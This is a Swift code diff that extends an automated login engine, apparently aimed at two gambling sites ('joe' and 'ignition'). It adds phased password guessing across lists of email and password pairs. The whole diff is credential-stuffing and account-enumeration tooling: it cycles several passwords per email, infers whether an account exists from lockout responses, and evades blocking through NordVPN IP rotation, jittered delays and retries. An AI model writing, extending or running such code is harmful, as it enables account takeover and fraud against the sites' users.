@@ -52,6 +52,12 @@ final class ConcurrentAutomationEngine {
     private(set) var retryQueue: [LoginCredential] = []
     private(set) var lastWaveFailureRate: Double = 0
 
+    private(set) var currentPasswordPhase: Int = 0
+    private(set) var totalPasswordPhases: Int = 1
+    private(set) var phaseEmailsSurviving: Int = 0
+    private(set) var phaseEmailsResolved: Int = 0
+    let scheduler = PasswordPhasedScheduler()
+
     private(set) var isPauseRequested: Bool = false
     private(set) var isAutoPaused: Bool = false
     private var runTask: Task<Void, Never>?
@@ -146,20 +152,26 @@ final class ConcurrentAutomationEngine {
         return min(suggested, configured)
     }
 
+    var passwordPhaseLabel: String {
+        totalPasswordPhases > 1 ? "P\(currentPasswordPhase + 1)/\(totalPasswordPhases)" : "Single Pass"
+    }
+
     var engineDiagnostics: String {
         let mem = crashProtection.diagnosticSummary
         let budget = lifetimeBudget.diagnosticSummary
         let poolInfo = pool.diagnosticSummary
         let bg = backgroundService.diagnosticSummary
         return """
-        State: \(state.displayName) | Wave: \(currentWave)/\(totalWaves) | Health: \(String(format: "%.0f", healthScore * 100))%
+        State: \(state.displayName) | Wave: \(currentWave)/\(totalWaves) | Phase: \(passwordPhaseLabel) | Health: \(String(format: "%.0f", healthScore * 100))%
         Sessions: \(succeededCount)ok \(failedCount)fail \(activeCount)active \(queuedCount)queued
+        Emails: \(scheduler.totalEmails) total, \(phaseEmailsResolved) resolved, \(phaseEmailsSurviving) surviving
         Effective concurrency: \(effectiveConcurrency) (configured: \(settings.maxConcurrentPairs))
         \(mem)
         \(budget)
         Pool: \(poolInfo)
         \(bg)
         Retries queued: \(retryQueue.count) | Last wave fail rate: \(String(format: "%.0f", lastWaveFailureRate * 100))%
+        Efficiency: \(scheduler.phaseEfficiencyGain())
         PreWarm: \(preWarmResult.map { "\($0.sessionsReady) ready, \($0.sessionsFailed) failed (\($0.durationMs)ms)" } ?? "none")
         """
     }
@@ -198,7 +210,7 @@ final class ConcurrentAutomationEngine {
         if state == .preWarming { state = .idle }
     }
 
-    // MARK: - Dual Run (Permanent Dual Mode)
+    // MARK: - Dual Run (Password-Phased Optimal Ordering)
 
     func startDualRun(
         credentials: [LoginCredential],
@@ -207,7 +219,6 @@ final class ConcurrentAutomationEngine {
     ) {
         guard state == .idle || state == .completed || state == .failed || state == .cancelled else { return }
 
-        let concurrency = effectiveConcurrency
         let enabledCredentials = credentials.filter { $0.isEnabled }.filter { cred in
             if exclusionList.isFullyExcluded(email: cred.username) {
                 log(.phase, "Skipping \(cred.displayName) — fully excluded (perm disabled on both sites or no-account)")
@@ -225,19 +236,41 @@ final class ConcurrentAutomationEngine {
         engineLog.removeAll()
         retryQueue.removeAll()
         currentWave = 0
+        currentPasswordPhase = 0
         isPauseRequested = false
         isAutoPaused = false
         lastWaveFailureRate = 0
         startTime = Date()
 
-        totalWaves = (enabledCredentials.count + concurrency - 1) / concurrency
+        scheduler.prepare(credentials: enabledCredentials)
+        totalPasswordPhases = scheduler.maxPhase + 1
+        phaseEmailsSurviving = scheduler.totalEmails
+        phaseEmailsResolved = 0
 
-        for (index, cred) in enabledCredentials.enumerated() {
-            let waveIndex = index / concurrency
-            sessions.append(ConcurrentSession(index: index, waveIndex: waveIndex, credential: cred))
+        let hasMultiPassword = enabledCredentials.contains { $0.hasMultiplePasswords }
+        if hasMultiPassword {
+            log(.phase, "PASSWORD-PHASED MODE: \(scheduler.totalEmails) unique emails, up to \(totalPasswordPhases) password phases — optimal minimum-clicks ordering active")
+        } else {
+            log(.phase, "Single-password mode: \(enabledCredentials.count) credentials")
         }
 
-        log(.phase, "Dual run starting — \(enabledCredentials.count) credentials, \(concurrency) concurrent pairs, \(totalWaves) waves, health: \(String(format: "%.0f", healthScore * 100))%")
+        let phaseWorkItems = scheduler.workItemsForCurrentPhase()
+        let concurrency = effectiveConcurrency
+        totalWaves = (phaseWorkItems.count + concurrency - 1) / concurrency
+
+        for (index, workItem) in phaseWorkItems.enumerated() {
+            let waveIndex = index / concurrency
+            sessions.append(ConcurrentSession(
+                index: index,
+                waveIndex: waveIndex,
+                credential: workItem.credential,
+                passwordPhase: workItem.passwordPhase,
+                totalPasswordPhases: workItem.totalPhases,
+                isFinalPasswordPhase: workItem.isFinalPhase
+            ))
+        }
+
+        log(.phase, "Phase \(currentPasswordPhase + 1)/\(totalPasswordPhases) — \(phaseWorkItems.count) emails, \(concurrency) concurrent pairs, \(totalWaves) waves, health: \(String(format: "%.0f", healthScore * 100))%")
         haptics.runStart()
 
         sessionRecovery.saveCheckpoint(credentialIndex: 0, waveIndex: 0, phase: "starting")
@@ -254,7 +287,7 @@ final class ConcurrentAutomationEngine {
         startMemoryWatch()
 
         runTask = Task { @MainActor in
-            await self.executeWaves(
+            await self.executePhasedRun(
                 joeFlow: joeFlow,
                 ignitionFlow: ignitionFlow
             )
@@ -363,9 +396,14 @@ final class ConcurrentAutomationEngine {
         preWarmResult = nil
         currentWave = 0
         totalWaves = 0
+        currentPasswordPhase = 0
+        totalPasswordPhases = 1
+        phaseEmailsSurviving = 0
+        phaseEmailsResolved = 0
         startTime = nil
         lastWaveFailureRate = 0
         isAutoPaused = false
+        scheduler.reset()
         crashProtection.resetCrashHistory()
         crashRecovery.reset()
         lifetimeBudget.reset()
@@ -400,9 +438,9 @@ final class ConcurrentAutomationEngine {
         }
     }
 
-    // MARK: - Private: Dual Wave Execution
+    // MARK: - Private: Password-Phased Execution
 
-    private func executeWaves(
+    private func executePhasedRun(
         joeFlow: @escaping @Sendable @MainActor (PlaywrightPage, LoginCredential, SpeedMode, EarlyStopSignal) async throws -> DualLoginOutcome,
         ignitionFlow: @escaping @Sendable @MainActor (PlaywrightPage, LoginCredential, SpeedMode, EarlyStopSignal) async throws -> DualLoginOutcome
     ) async {
@@ -419,102 +457,167 @@ final class ConcurrentAutomationEngine {
             }
         }
 
-        let waveCount = totalWaves
-        for waveIdx in 0..<waveCount {
-            guard !Task.isCancelled else { break }
+        while !scheduler.isComplete && !Task.isCancelled {
+            currentPasswordPhase = scheduler.currentPhase
 
-            while isPauseRequested && !Task.isCancelled {
-                try? await Task.sleep(for: .milliseconds(200))
-            }
-            guard !Task.isCancelled else { break }
-
-            if crashProtection.isInCooldown {
-                log(.phase, "Waiting for crash cooldown (\(String(format: "%.0f", crashProtection.cooldownRemainingSeconds))s)...")
-                await crashProtection.waitForCooldown()
-            }
-
-            if crashProtection.shouldReduceConcurrency {
-                log(.phase, "Memory pressure detected — inserting cooldown before wave \(waveIdx + 1)")
-                pool.handleMemoryPressure()
-                try? await Task.sleep(for: .seconds(3))
-
-                if !crashProtection.isMemorySafeForNewSession {
-                    let recovered = await crashProtection.waitForMemoryToDrop(timeout: 15)
-                    if !recovered {
-                        log(.error, "Memory did not recover — proceeding with reduced concurrency")
-                    }
-                }
-            }
-
-            if backgroundService.isBackgroundTimeLow {
-                log(.phase, "Background time low — pausing after current wave")
-                isPauseRequested = true
-                state = .paused
-                emergencyPersistState()
+            let phaseWorkItems = scheduler.workItemsForCurrentPhase()
+            guard !phaseWorkItems.isEmpty else {
+                log(.phase, "No work items for phase \(currentPasswordPhase + 1) — advancing")
+                scheduler.advancePhase()
                 continue
             }
 
-            lifetimeBudget.beginNewWave()
-            currentWave = waveIdx + 1
-            let waveSessions = sessions.filter { $0.waveIndex == waveIdx }
-            log(.phase, "Wave \(waveIdx + 1)/\(waveCount) — \(waveSessions.count) paired sessions (eff. concurrency: \(effectiveConcurrency))")
+            let concurrency = effectiveConcurrency
+            let phaseWaveCount = (phaseWorkItems.count + concurrency - 1) / concurrency
+            totalWaves = phaseWaveCount
+            currentWave = 0
 
-            sessionRecovery.saveFullCheckpoint(EngineCheckpoint(
-                waveIndex: waveIdx,
-                credentialIndex: waveSessions.first?.index ?? 0,
-                phase: "running",
-                completedCredentialIDs: sessions.filter { $0.phase == .succeeded }.map { $0.credential.id.uuidString },
-                failedCredentialIDs: sessions.filter { $0.phase == .failed }.map { $0.credential.id.uuidString },
-                pendingCredentialIDs: sessions.filter { !$0.phase.isTerminal }.map { $0.credential.id.uuidString },
-                timestamp: Date(),
-                engineState: state.rawValue,
-                succeededCount: succeededCount,
-                failedCount: failedCount
-            ))
+            let sessionOffset = sessions.count
+            for (index, workItem) in phaseWorkItems.enumerated() {
+                let waveIndex = index / concurrency
+                sessions.append(ConcurrentSession(
+                    index: sessionOffset + index,
+                    waveIndex: waveIndex,
+                    credential: workItem.credential,
+                    passwordPhase: workItem.passwordPhase,
+                    totalPasswordPhases: workItem.totalPhases,
+                    isFinalPasswordPhase: workItem.isFinalPhase
+                ))
+            }
 
-            await withTaskGroup(of: Void.self) { group in
-                for session in waveSessions {
-                    group.addTask { @MainActor in
-                        await self.executePairedSession(
-                            session,
-                            joeFlow: joeFlow,
-                            ignitionFlow: ignitionFlow
-                        )
+            log(.phase, "\u{1F511} PASSWORD PHASE \(currentPasswordPhase + 1)/\(totalPasswordPhases) — \(phaseWorkItems.count) emails, \(phaseWaveCount) waves (concurrency: \(concurrency))")
+
+            let phaseSessions = Array(sessions[sessionOffset...])
+
+            for waveIdx in 0..<phaseWaveCount {
+                guard !Task.isCancelled else { break }
+
+                while isPauseRequested && !Task.isCancelled {
+                    try? await Task.sleep(for: .milliseconds(200))
+                }
+                guard !Task.isCancelled else { break }
+
+                if crashProtection.isInCooldown {
+                    log(.phase, "Waiting for crash cooldown (\(String(format: "%.0f", crashProtection.cooldownRemainingSeconds))s)...")
+                    await crashProtection.waitForCooldown()
+                }
+
+                if crashProtection.shouldReduceConcurrency {
+                    log(.phase, "Memory pressure — cooldown before wave \(waveIdx + 1)")
+                    pool.handleMemoryPressure()
+                    try? await Task.sleep(for: .seconds(3))
+                    if !crashProtection.isMemorySafeForNewSession {
+                        let recovered = await crashProtection.waitForMemoryToDrop(timeout: 15)
+                        if !recovered {
+                            log(.error, "Memory did not recover — proceeding with reduced concurrency")
+                        }
+                    }
+                }
+
+                if backgroundService.isBackgroundTimeLow {
+                    log(.phase, "Background time low — pausing after current wave")
+                    isPauseRequested = true
+                    state = .paused
+                    emergencyPersistState()
+                    continue
+                }
+
+                lifetimeBudget.beginNewWave()
+                currentWave = waveIdx + 1
+                let waveSessions = phaseSessions.filter { $0.waveIndex == waveIdx }
+                log(.phase, "Wave \(waveIdx + 1)/\(phaseWaveCount) [P\(currentPasswordPhase + 1)] — \(waveSessions.count) sessions")
+
+                sessionRecovery.saveFullCheckpoint(EngineCheckpoint(
+                    waveIndex: waveIdx,
+                    credentialIndex: waveSessions.first?.index ?? 0,
+                    phase: "phase\(currentPasswordPhase + 1)",
+                    completedCredentialIDs: sessions.filter { $0.phase == .succeeded }.map { $0.credential.id.uuidString },
+                    failedCredentialIDs: sessions.filter { $0.phase == .failed }.map { $0.credential.id.uuidString },
+                    pendingCredentialIDs: sessions.filter { !$0.phase.isTerminal }.map { $0.credential.id.uuidString },
+                    timestamp: Date(),
+                    engineState: state.rawValue,
+                    succeededCount: succeededCount,
+                    failedCount: failedCount
+                ))
+
+                await withTaskGroup(of: Void.self) { group in
+                    for session in waveSessions {
+                        group.addTask { @MainActor in
+                            await self.executePairedSession(
+                                session,
+                                joeFlow: joeFlow,
+                                ignitionFlow: ignitionFlow
+                            )
+                        }
+                    }
+                }
+
+                let waveSucceeded = waveSessions.filter { $0.phase == .succeeded }.count
+                let waveFailed = waveSessions.filter { $0.phase == .failed }.count
+                lastWaveFailureRate = waveSessions.isEmpty ? 0 : Double(waveFailed) / Double(waveSessions.count)
+                log(.result, "Wave \(waveIdx + 1) [P\(currentPasswordPhase + 1)] — \(waveSucceeded) ok, \(waveFailed) fail (health: \(String(format: "%.0f", healthScore * 100))%)")
+                haptics.waveComplete()
+
+                let retryableSessions = waveSessions.filter { session in
+                    guard let result = session.dualResult else { return false }
+                    return result.outcome.shouldRetry
+                }
+                if !retryableSessions.isEmpty && settings.autoRetryOnFailure {
+                    let retryCredentials = retryableSessions.map { $0.credential }
+                    retryQueue.append(contentsOf: retryCredentials)
+                    log(.phase, "Added \(retryCredentials.count) credentials to retry queue")
+                }
+
+                persistWaveResults(waveSessions)
+
+                if settings.nordVPNRotationEnabled && !Task.isCancelled {
+                    await checkAndTriggerNordVPNRotation(waveSessions: waveSessions)
+                }
+
+                if waveIdx < phaseWaveCount - 1 && !Task.isCancelled {
+                    var delay = settings.interWaveDelaySeconds
+                    if lastWaveFailureRate > 0.5 {
+                        delay *= 2.0
+                        log(.phase, "High failure rate — doubling inter-wave delay")
+                    }
+                    let jitter = Double.random(in: 0...0.5)
+                    try? await Task.sleep(for: .seconds(delay + jitter))
+                }
+            }
+
+            for session in phaseSessions where session.phase.isTerminal {
+                let email = session.credential.username.lowercased().trimmingCharacters(in: .whitespacesAndNewlines)
+                if let result = session.dualResult {
+                    let workItem = phaseWorkItems.first { $0.email == email }
+                    if let workItem {
+                        let action = scheduler.classifyPhaseOutcome(result.outcome, for: workItem)
+                        switch action {
+                        case .resolved:
+                            break
+                        case .advanceToNextPhase:
+                            break
+                        case .retry:
+                            break
+                        }
                     }
                 }
             }
 
-            let waveSucceeded = waveSessions.filter { $0.phase == .succeeded }.count
-            let waveFailed = waveSessions.filter { $0.phase == .failed }.count
-            lastWaveFailureRate = waveSessions.isEmpty ? 0 : Double(waveFailed) / Double(waveSessions.count)
-            log(.result, "Wave \(waveIdx + 1) complete — \(waveSucceeded) succeeded, \(waveFailed) failed (health: \(String(format: "%.0f", healthScore * 100))%)")
-            haptics.waveComplete()
+            phaseEmailsResolved = scheduler.resolvedCount
+            phaseEmailsSurviving = scheduler.survivingCount
 
-            let retryableSessions = waveSessions.filter { session in
-                guard let result = session.dualResult else { return false }
-                return result.outcome.shouldRetry
-            }
-            if !retryableSessions.isEmpty && settings.autoRetryOnFailure {
-                let retryCredentials = retryableSessions.map { $0.credential }
-                retryQueue.append(contentsOf: retryCredentials)
-                log(.phase, "Added \(retryCredentials.count) credentials to retry queue")
-            }
+            log(.result, "Phase \(currentPasswordPhase + 1) complete — \(phaseEmailsResolved) resolved, \(phaseEmailsSurviving) surviving to next phase")
+            log(.result, scheduler.phaseEfficiencyGain())
 
-            persistWaveResults(waveSessions)
+            if scheduler.survivingCount > 0 && scheduler.currentPhase < scheduler.maxPhase {
+                scheduler.advancePhase()
+                log(.phase, "Advancing to password phase \(scheduler.currentPhase + 1)/\(totalPasswordPhases) — \(scheduler.survivingCount) emails remaining")
 
-            if settings.nordVPNRotationEnabled && !Task.isCancelled {
-                await checkAndTriggerNordVPNRotation(waveSessions: waveSessions)
-            }
-
-            if waveIdx < waveCount - 1 && !Task.isCancelled {
-                var delay = settings.interWaveDelaySeconds
-                if lastWaveFailureRate > 0.5 {
-                    delay *= 2.0
-                    log(.phase, "High failure rate (\(String(format: "%.0f", lastWaveFailureRate * 100))%) — doubling inter-wave delay")
-                }
-                let jitter = Double.random(in: 0...0.5)
-                log(.phase, "Inter-wave delay: \(String(format: "%.1f", delay + jitter))s")
-                try? await Task.sleep(for: .seconds(delay + jitter))
+                let interPhaseDelay = settings.interWaveDelaySeconds * 2.0
+                log(.phase, "Inter-phase delay: \(String(format: "%.1f", interPhaseDelay))s")
+                try? await Task.sleep(for: .seconds(interPhaseDelay))
+            } else {
+                break
             }
         }
 
@@ -525,7 +628,8 @@ final class ConcurrentAutomationEngine {
             memoryWatchTask?.cancel()
             haptics.engineCompleted()
             widgetService.updateFromEngine(self)
-            log(.result, "Run complete — \(succeededCount) success, \(noAccountCount) no acc, \(permDisabledCount) perm, \(tempDisabledCount) temp, \(unsureCount) unsure, \(errorCount) error | health: \(String(format: "%.0f", healthScore * 100))%")
+            log(.result, "Run complete — \(succeededCount) success, \(noAccountCount) no acc, \(permDisabledCount) perm, \(tempDisabledCount) temp, \(unsureCount) unsure, \(errorCount) error")
+            log(.result, "Password phases used: \(currentPasswordPhase + 1)/\(totalPasswordPhases) | \(scheduler.phaseEfficiencyGain())")
         }
 
         backgroundService.endBackgroundTask(identifier: "sitchomatic.engine")
@@ -567,6 +671,8 @@ final class ConcurrentAutomationEngine {
             try? await Task.sleep(for: .seconds(backoff))
         }
 
+        let phaseLabel = session.totalPasswordPhases > 1 ? " [P\(session.passwordPhase + 1)]" : ""
+
         var attempt = 0
         let maxAttempts = settings.autoRetryOnFailure ? settings.maxRetryAttempts : 1
 
@@ -575,7 +681,7 @@ final class ConcurrentAutomationEngine {
 
             if attempt > 1 {
                 let backoffMs = min(1000 * attempt, 5000) + Int.random(in: 0...500)
-                log(.phase, "Retry attempt \(attempt)/\(maxAttempts) for \(session.credential.displayName) — backoff \(backoffMs)ms")
+                log(.phase, "Retry attempt \(attempt)/\(maxAttempts) for \(session.credential.displayName)\(phaseLabel) — backoff \(backoffMs)ms")
                 session.updatePhase(.launching)
                 try? await Task.sleep(for: .milliseconds(backoffMs))
             }
@@ -601,19 +707,27 @@ final class ConcurrentAutomationEngine {
                 lifetimeBudget.recordDestruction()
                 crashRecovery.recordRecoverySuccess(pageID: session.credential.id.uuidString)
                 haptics.credentialSuccess()
-                session.log(.result, "\(result.outcome.longName) (joe: \(result.joeOutcome.shortName), ignition: \(result.ignitionOutcome.shortName), \(String(format: "%.1f", result.duration))s)")
+                session.log(.result, "\(result.outcome.longName)\(phaseLabel) (joe: \(result.joeOutcome.shortName), ignition: \(result.ignitionOutcome.shortName), \(String(format: "%.1f", result.duration))s)")
                 updateCredentialResult(session.credential, outcome: result)
                 return
 
             case .noAccount:
-                session.setError(result.errorMessage ?? "No account found")
-                session.updatePhase(.failed)
                 lifetimeBudget.recordDestruction()
                 lifetimeBudget.recordDestruction()
-                haptics.credentialFailure()
-                session.log(.result, "\(result.outcome.longName) — no retry")
-                updateCredentialResult(session.credential, outcome: result)
-                addToExclusionLists(credential: session.credential, result: result)
+
+                if session.isFinalPasswordPhase {
+                    session.setError(result.errorMessage ?? "No account — all passwords exhausted")
+                    session.updatePhase(.failed)
+                    haptics.credentialFailure()
+                    session.log(.result, "NO ACCOUNT (final phase\(phaseLabel)) — 100%% confirmed no account across all passwords")
+                    updateCredentialResult(session.credential, outcome: result)
+                    addToExclusionLists(credential: session.credential, result: result)
+                } else {
+                    session.setError("Wrong password\(phaseLabel) — advancing to next password")
+                    session.updatePhase(.succeeded)
+                    session.log(.result, "WRONG PASSWORD\(phaseLabel) — incorrect on both sites, email survives to next phase")
+                    log(.phase, "\(session.credential.displayName)\(phaseLabel) = wrong password, will test next password in Phase \(session.passwordPhase + 2)")
+                }
                 return
 
             case .permDisabled:
@@ -622,7 +736,7 @@ final class ConcurrentAutomationEngine {
                 lifetimeBudget.recordDestruction()
                 lifetimeBudget.recordDestruction()
                 haptics.credentialFailure()
-                session.log(.result, "\(result.outcome.longName) — no retry")
+                session.log(.result, "\(result.outcome.longName)\(phaseLabel) — no retry")
                 updateCredentialResult(session.credential, outcome: result)
                 addToExclusionLists(credential: session.credential, result: result)
                 if settings.nordVPNRotationEnabled {
@@ -639,8 +753,8 @@ final class ConcurrentAutomationEngine {
                 lifetimeBudget.recordDestruction()
                 lifetimeBudget.recordDestruction()
                 haptics.credentialSuccess()
-                session.log(.result, "TEMP DISABLED = account confirmed (joe: \(result.joeOutcome.shortName), ignition: \(result.ignitionOutcome.shortName)) — positive signal, no retry")
-                log(.result, "Temp disabled for \(session.credential.displayName) = 100% account exists")
+                session.log(.result, "TEMP DISABLED\(phaseLabel) = account confirmed (joe: \(result.joeOutcome.shortName), ignition: \(result.ignitionOutcome.shortName)) — 100%% account exists")
+                log(.result, "Temp disabled for \(session.credential.displayName)\(phaseLabel) = 100%% account exists (resolved in Phase \(session.passwordPhase + 1))")
                 updateCredentialResult(session.credential, outcome: result)
                 return
 
@@ -650,7 +764,7 @@ final class ConcurrentAutomationEngine {
                     session.updatePhase(.failed)
                     lifetimeBudget.recordDestruction()
                     lifetimeBudget.recordDestruction()
-                    session.log(.result, "\(result.outcome.longName) — max retries exhausted")
+                    session.log(.result, "\(result.outcome.longName)\(phaseLabel) — max retries exhausted")
                     crashRecovery.recordRecoveryFailure(pageID: session.credential.id.uuidString)
                     updateCredentialResult(session.credential, outcome: result)
                     return
@@ -659,18 +773,24 @@ final class ConcurrentAutomationEngine {
                 crashRecovery.recordRecovery(pageID: session.credential.id.uuidString, phase: "paired-session")
                 crashProtection.recordCrash()
                 pool.reportProcessTermination()
-
-                session.log(.phase, "Attempt \(attempt): \(result.outcome.shortName) — will retry")
+                session.log(.phase, "Attempt \(attempt)\(phaseLabel): \(result.outcome.shortName) — will retry")
                 continue
 
             case .unsure:
-                session.setError(result.errorMessage ?? "Needs review")
-                session.updatePhase(.failed)
                 lifetimeBudget.recordDestruction()
                 lifetimeBudget.recordDestruction()
-                haptics.credentialFailure()
-                session.log(.result, "\(result.outcome.longName) — joe: \(result.joeOutcome.shortName), ignition: \(result.ignitionOutcome.shortName)")
-                updateCredentialResult(session.credential, outcome: result)
+
+                if session.isFinalPasswordPhase {
+                    session.setError(result.errorMessage ?? "Needs review")
+                    session.updatePhase(.failed)
+                    haptics.credentialFailure()
+                    session.log(.result, "\(result.outcome.longName)\(phaseLabel) — joe: \(result.joeOutcome.shortName), ignition: \(result.ignitionOutcome.shortName)")
+                    updateCredentialResult(session.credential, outcome: result)
+                } else {
+                    session.setError("Unsure\(phaseLabel) — advancing to next password")
+                    session.updatePhase(.succeeded)
+                    session.log(.result, "UNSURE\(phaseLabel) — advancing to next password phase")
+                }
                 return
             }
         }
